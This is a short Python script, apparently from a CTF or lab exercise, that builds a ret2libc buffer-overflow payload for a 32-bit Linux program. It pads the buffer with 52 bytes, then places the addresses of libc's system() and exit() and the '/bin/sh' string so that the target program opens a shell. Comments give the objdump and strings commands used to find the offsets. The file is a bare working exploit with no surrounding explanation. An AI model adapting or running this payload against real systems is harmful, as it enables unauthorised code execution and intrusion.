#!/usr/bin/env python

import struct

libc_base = 0xb7e19000
# objdump -T /lib/i386-linux-gnu/libc.so.6|grep system
system_offset = 0x0003ada0
exit_offset = 0x0002e9d0
# strings -a -t x /lib/i386-linux-gnu/libc.so.6|grep "/bin/sh"
binsh_offset = 0x0015ba0b

system_addr = struct.pack("<I", libc_base + system_offset)
binsh_addr = struct.pack("<I", libc_base + binsh_offset)
exit_addr = struct.pack("<I", libc_base + exit_offset)

payload = "A"*52
payload += system_addr
payload += exit_addr
payload += binsh_addr

print payload
